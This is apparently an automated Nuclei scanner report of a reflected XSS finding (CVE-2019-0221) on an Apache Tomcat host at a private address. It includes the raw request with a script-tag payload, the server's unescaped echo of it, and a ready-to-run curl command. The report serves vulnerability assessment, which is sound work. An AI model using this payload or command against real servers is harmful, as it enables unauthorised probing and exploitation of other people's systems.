### Apache Tomcat XSS (CVE-2019-0221) found on http://192.168.198.179:8080/
---
**Details**: **CVE-2019-0221**  matched at http://192.168.198.179:8080/

**Protocol**: HTTP

**Full URL**: http://192.168.198.179:8080/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E

**Timestamp**: Wed Jun 8 20:22:27 +0100 BST 2022

**Template Information**

| Key | Value |
|---|---|
| Name | Apache Tomcat XSS |
| Authors | pikpikcu |
| Tags | cve, cve2019, apache, xss, tomcat |
| Severity | medium |
| Description | The SSI printenv command in Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and
7.0.0 to 7.0.93 echoes user provided data without escaping and is,
therefore, vulnerable to XSS. SSI is disabled by default.
The printenv command is intended for debugging and is unlikely to be present in a production website.
 |
| CVSS-Metrics | [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |
| CWE-ID | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) |
| CVE-ID | [CVE-2019-0221](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2019-0221) |
| CVSS-Score | 6.10 |

**Request**
```http
GET /ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E HTTP/1.1
Host: 192.168.198.179:8080
User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.0 200 OK
Connection: close
Content-Length: 190
Content-Type: text/html

<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/ssi/printenv.shtml?<script>alert('xss')</script></B> was not found.</BODY></HTML>
```

References: 
- https://seclists.org/fulldisclosure/2019/may/50
- https://wwws.nightwatchcybersecurity.com/2019/05/27/xss-in-ssi-printenv-command-apache-tomcat-cve-2019-0221/
- https://www.exploit-db.com/exploits/50119
- https://lists.apache.org/thread.html/6e6e9eacf7b28fd63d249711e9d3ccd4e0a83f556e324aee37be5a8c@%3cannounce.tomcat.apache.org%3e

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36' 'http://192.168.198.179:8080/ssi/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E'
```
---
Generated by [Nuclei 2.7.1](https://github.com/projectdiscovery/nuclei)